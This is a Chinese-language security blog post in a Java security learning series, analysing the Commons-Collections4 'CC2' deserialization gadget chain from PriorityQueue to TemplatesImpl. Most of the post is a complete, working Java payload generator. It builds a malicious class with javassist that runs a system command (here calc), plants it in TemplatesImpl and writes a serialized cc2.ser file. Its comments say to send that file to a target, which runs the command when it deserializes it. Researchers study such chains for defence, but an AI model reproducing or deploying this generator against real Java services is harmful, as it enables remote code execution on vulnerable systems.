+++
title = "CC链子2"
date = 2026-06-14T20:20:00+08:00
draft = false
description = "由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"
tags = ["Java安全", "安全研究"]
categories = ["安全研究"]
series = ["Java 安全 持续学习"]
pin = false
cover = "/images/posts/java-security-banner.svg"
+++
## 前言

由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。

## 原理

- 依赖 `commons-collections4` (4.0-4.4 版本)
    
- 使用 `PriorityQueue` 作为反序列化入口
    
- 使用 `TemplatesImpl` 加载恶意字节码实现任意代码执行

不是通过runtime.getruntime.exec()来执行最后命令的，而是通过  TemplatesImpl  接收恶意字节码并调用   newTransformer()   JVM 加载恶意类，恶意代码在内存中执行  这种黑名单防御不了 是通过内存实现的

整体流程

PriorityQueue.readObject()
    ↓
PriorityQueue.heapify()
    ↓
PriorityQueue.siftDown()
    ↓
PriorityQueue.siftDownUsingComparator()
    ↓
TransformingComparator.compare()
    ↓
ChainedTransformer.transform()
    ↓
ConstantTransformer / InvokerTransformer
    ↓
TemplatesImpl.newTransformer()
    ↓
TemplatesImpl.getTransletInstance()
    ↓
TemplatesImpl.defineTransletClasses()
    ↓
Runtime.getRuntime().exec()




## 步骤

源代码

### CC2Generator,java

```java
package cc2;

  

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javassist.*;

import javassist.bytecode.AccessFlag;

import org.apache.commons.collections4.Transformer;

import org.apache.commons.collections4.comparators.TransformingComparator;

import org.apache.commons.collections4.functors.ChainedTransformer;

import org.apache.commons.collections4.functors.ConstantTransformer;

import org.apache.commons.collections4.functors.InvokerTransformer;

  

import java.io.FileOutputStream;

import java.io.ObjectOutputStream;

import java.lang.reflect.Field;

import java.util.PriorityQueue;

  

/**

 * CC2 Payload 生成器

 * 生成恶意序列化文件，反序列化后会弹出计算器

 *

 * 使用方法:

 * 1. 运行此程序生成 cc2.ser 文件

 * 2. 将 cc2.ser 发送给目标

 * 3. 目标反序列化该文件时会执行命令

 */

public class CC2Generator {

  

    public static void main(String[] args) throws Exception {

        if (args.length < 1) {

            System.out.println("CC2 Payload 生成器");

            System.out.println("==================");

            System.out.println("用法: java CC2Generator <输出文件>");

            System.out.println("示例: java CC2Generator cc2.ser");

            System.out.println("\n注意: 反序列化生成的文件会执行 calc 命令弹出计算器");

            return;

        }

  

        String outputFile = args[0];

  

        System.out.println("[*] 开始生成 CC2 Payload...");

  

        // 生成 Payload

        Object payload = generatePayload();

  

        // 序列化到文件

        serialize(payload, outputFile);

  

        System.out.println("[+] Payload 生成完成！");

        System.out.println("[+] 输出文件: " + outputFile);

        System.out.println("[+] 反序列化该文件将执行 calc 命令");

    }

  

    /**

     * 生成 CC2 Payload

     *

     * @return 可触发反序列化攻击的 PriorityQueue 对象

     */

    public static Object generatePayload() throws Exception {

        System.out.println("[*] 步骤1: 生成恶意字节码...");

        byte[] evilBytes = generateEvilBytecode("calc");

  

        System.out.println("[*] 步骤2: 创建 TemplatesImpl 实例...");

        TemplatesImpl templates = createTemplatesImpl(evilBytes);

  

        System.out.println("[*] 步骤3: 构造 ChainedTransformer...");

        ChainedTransformer chainedTransformer = createTransformerChain(templates);

  

        System.out.println("[*] 步骤4: 创建 TransformingComparator...");

        TransformingComparator comparator = new TransformingComparator(chainedTransformer);

  

        System.out.println("[*] 步骤5: 封装进 PriorityQueue...");

        PriorityQueue queue = new PriorityQueue(2, comparator);

        queue.add(1);

        queue.add(2);

  

        System.out.println("[+] Payload 生成完成！");

        return queue;

    }

  

    /**

     * 生成恶意字节码

     *

     * @param command 要执行的系统命令

     * @return 恶意类的字节数组

     */

    private static byte[] generateEvilBytecode(String command) throws Exception {

        ClassPool pool = ClassPool.getDefault();

        // 添加当前类的 ClassPath，以便访问 JDK 内部类

        pool.insertClassPath(new ClassClassPath(CC2Generator.class));

  

        // 创建恶意类

        CtClass evilClass = pool.makeClass("EvilClass" + System.nanoTime());

  

        // 设置父类为 AbstractTranslet（必须）

        evilClass.setSuperclass(pool.get(

                "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"

        ));

  

        // 添加静态代码块执行命令

        String body = String.format("Runtime.getRuntime().exec(\"%s\");", command);

        evilClass.makeClassInitializer().insertBefore(body);

  

        // 添加必须实现的抽象方法

        // 创建虚拟的 SerializationHandler 接口

        CtClass domClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.DOM");

        CtClass dtmIteratorClass = pool.get("com.sun.org.apache.xml.internal.dtm.DTMAxisIterator");

        CtClass shInterface = pool.makeInterface("com.sun.org.apache.xml.internal.serialize.SerializationHandler");

  

        // 方法1: transform(DOM, DTMAxisIterator, SerializationHandler)

        CtMethod method1 = new CtMethod(CtClass.voidType, "transform", new CtClass[]{

                domClass, dtmIteratorClass, shInterface

        }, evilClass);

        method1.setModifiers(AccessFlag.PUBLIC);

        method1.setBody("{}");

        evilClass.addMethod(method1);

  

        // 方法2: transform(DOM, SerializationHandler[])

        // 使用 Object[] 类型替代

        CtMethod method2 = new CtMethod(CtClass.voidType, "transform", new CtClass[]{

                domClass, pool.get("java.lang.Object[]")

        }, evilClass);

        method2.setModifiers(AccessFlag.PUBLIC);

        method2.setBody("{}");

        evilClass.addMethod(method2);

  

        byte[] bytecode = evilClass.toBytecode();

        System.out.println("    [+] 字节码大小: " + bytecode.length + " 字节");

        return bytecode;

    }

  

    /**

     * 创建 TemplatesImpl 实例

     *

     * @param evilBytes 恶意类的字节码

     * @return 配置好的 TemplatesImpl 实例

     */

    private static TemplatesImpl createTemplatesImpl(byte[] evilBytes) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();

  

        // 设置 _bytecodes

        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");

        bytecodesField.setAccessible(true);

        bytecodesField.set(templates, new byte[][]{evilBytes});

  

        // 设置 _name

        Field nameField = TemplatesImpl.class.getDeclaredField("_name");

        nameField.setAccessible(true);

        nameField.set(templates, "anything");

  

        // 设置 _tfactory（必须）

        Field tfactoryField = TemplatesImpl.class.getDeclaredField("_tfactory");

        tfactoryField.setAccessible(true);

        tfactoryField.set(templates, new TransformerFactoryImpl());

  

        System.out.println("    [+] TemplatesImpl 创建成功");

        return templates;

    }

  

    /**

     * 创建 Transformer 链

     *

     * @param templates TemplatesImpl 实例

     * @return ChainedTransformer 实例

     */

    private static ChainedTransformer createTransformerChain(TemplatesImpl templates) {

        Transformer[] transformers = new Transformer[]{

                new ConstantTransformer(templates),

                new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{})

        };

  

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        System.out.println("    [+] Transformer 链长度: " + transformers.length);

        return chainedTransformer;

    }

  

    /**

     * 序列化对象到文件

     *

     * @param obj      要序列化的对象

     * @param filename 输出文件名

     */

    private static void serialize(Object obj, String filename) throws Exception {

        try (FileOutputStream fos = new FileOutputStream(filename);

             ObjectOutputStream oos = new ObjectOutputStream(fos)) {

            oos.writeObject(obj);

        }

        System.out.println("[+] 序列化完成: " + filename);

    }

}
```


复现命令

mvn exec:java "-Dexec.mainClass=cc2.CC2AllInOne"

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260613161057317.png)






## 总结


|                        |                  |                                       |
| ---------------------- | ---------------- | ------------------------------------- |
| PriorityQueue          | 反序列化入口           | readObject() → heapify() → siftDown() |
| TransformingComparator | 触发 Transformer 链 | compare() → transform()               |
| ChainedTransformer     | 组合多个 Transformer | transform()                           |
| InvokerTransformer     | 反射调用方法           | transform() → Method.invoke()         |
| ConstantTransformer    | 返回常量值            | transform()                           |
| TemplatesImpl          | 加载恶意字节码          | newTransformer() → defineClass()      |
| AbstractTranslet       | 恶意类的父类           | 必须继承                                  |
